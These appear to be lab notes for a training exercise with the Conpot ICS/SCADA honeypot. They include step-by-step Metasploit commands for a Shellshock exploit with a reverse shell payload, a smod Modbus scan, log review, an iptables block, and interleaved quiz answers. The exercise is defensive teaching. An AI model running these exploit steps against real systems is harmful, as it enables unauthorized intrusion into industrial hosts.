_The Conpot honeypot_ is a noteworthy tool in cybersecurity, offering a sophisticated solution for identifying and mitigating cyber threats. Designed specifically to emulate industrial control systems (ICS) and supervisory control and data acquisition (SCADA) environments, Conpot aims to attract and engage malicious actors targeting critical infrastructure networks. This allows cybersecurity professionals to gain valuable insights into the techniques, tactics, and procedures used by adversaries. By simulating industrial control protocols and devices, Conpot effectively lures potential attackers into a controlled environment, ensuring their actions are closely monitored without exposing actual operational assets to risk.

Conpot's modular architecture and adaptable configurations enhance its efficacy, allowing security practitioners to tailor the emulated environment to match specific industrial protocols. This makes Conpot an indispensable tool for sectors such as energy, manufacturing, and utilities. Additionally, the open-source nature of the framework fosters collaboration, enabling a community of experts to contribute to its evolution and enhance its capabilities against evolving threats.

What term refers to a cybersecurity decoy used to observe and analyze malicious activities?
**Honeypot**
# Snmp service

Previously used for simulating SCADA devices and attack techniques, the Conpot honeypot will now be employed to analyze insights into attacks and their potential to enhance system defense strategies.

Given that Conpot will activate its own SNMP service, it's vital to cease it before initiating the launch of Conpot.
`sudo service snmpd stop`

### Starting Conpot

_Conpot_ is an open-source honeypot software designed to emulate various industrial control systems (ICS) protocols, like Modbus, DNP3, and S7comm, enabling the creation of realistic-looking ICS environments to detect and analyze attacks, gather threat intelligence, and employ features such as logging, alerting, and SNMP server simulation.

First, log in as the user conpot:
`su conpot`

When prompted for the password, enter conpot:
`conpot`

Lastly, to initiate Conpot, enter the following command:
`/home/conpot/.local/bin/conpot --template default --logfile /var/log/conpot/conpot.log -f --temp_dir /tmp`

Which systems does Conpot aim to simulate?
ICS and SCADA
# Starting Metasploit Framework

Navigate to the _Kali Student machine_ where the Metasploit Framework will be launched and utilized to launch the attacks on the Target machine hosting the Conpot Honeypot.

Utilize the following command to launch the Metasploit Framework:
`msfconsole -L
### Metasploit Configuration

The purpose of this particular activity is to execute the Shellshock exploit, which has been utilized in previous experiments. This exploit targets the host system with the goal of compromising it. The primary objective of this exercise is to gather valuable insights into the mechanics of the attack.

On the _metasploit_ console, use the following command:
`use exploit/multi/http/apache_mod_cgi_bash_env_exec

Set the RHOST and RPORT variable to:
`set RHOSTS 192.168.1.102
`set RPORT 8800
`set the TARGETURI varible to:
`set TARGETURI /

And lastly set the Payload variable to:
`set PAYLOAD linux/x86/shell/reverse_tcp

Utilize the exploit command to run the exploit once you've concluded with setting the necessary variables:
`exploit

Once the exploit has been executed, type the following command to exit the Metasploit console: `exit`
# Conpot Honeypot log review

Shift the focus back to the _Ubuntu student machine_ and observe the Conpot output. Conpot's successful detection of the observed activity, along with the inclusion of the actual shellcode that the attacker intended to upload onto the Target host, is noteworthy.
### Starting smod

Now, navigate to the _Kali Student machine_, utilize the smod framework based on Python and Scapy, which has been **explicitly developed** for conducting penetration testing on the Modbus protocol. Which is part of the SCADA honeypot that was launched in the previous step.

To initiate the smod framework utilize the following command:
`python2.7 /opt/smod/smod.py
### Configuring Smod module

_The Smod_ interface closely mirrors that of Metasploit. For this exercise, we will use Smod's getfunc module, a tool designed to identify the Modbus function codes supported by the target device. To select the appropriate module, enter the following command:
`use modbus/scanner/getfunc

During the configuration process, it's important to define two crucial parameters: the _target IP address_ and the _unit ID_. Set these options exactly as outlined below:
`set RHOSTS 192.168.1.102
`set UID 1

To set the port for the Modbus service, use the following command:
`set RPORT 5020

To initiate the scanning process, execute the exploit command:
`exploit

While encountering errors during this process is possible, it will become apparent that the scanner successfully gathers the list of supported function codes-data provided by Conpot. It is advisable to refrain from exiting the Smod shell at this stage, as it will be needed for the following steps.
![[Pasted image 20250805201850.png]]
Which Modbus function code is used to write a single coil?
**function code 5**
# Reviewing Conpot log file

Navigate back to the Target machine. Open a _new terminal_ and access the log file by using the following command:
`cat /var/log/conpot/conpot.log

You will notice that the log contains detailed information about the attempted attacks. This data is valuable and can be used to enhance the host security by identifying patterns, attack techniques, and potential vulnerabilities.
### Firewall Rule activation

In light of the actions detected from the Kali Student machine, which included uploading unauthorized shellcode and conducting reconnaissance on the honeypot, preemptive action is required.

To block the IP address of the Kali Student machine, use the _iptables_ utility to block incoming TCP packets from that machine.
`sudo iptables -A INPUT -p tcp --dport 5020 -s 192.168.1.100 -j DROP

Which command is used to check if the iptables rule was added successfully?
**sudo iptables -L**
# Attack Re-launch

Navigate back to the Kali Student machine running the smod scanner, and reattempt to run the exploit command:
`exploit
After making another attempt to scan using the exploit command in the terminal of the Student machine, no response is received, signifying that the firewall is successfully blocking the request packets.

Additionally, the information gathered from Conpot can be used to create rules for _IDS/IPS_.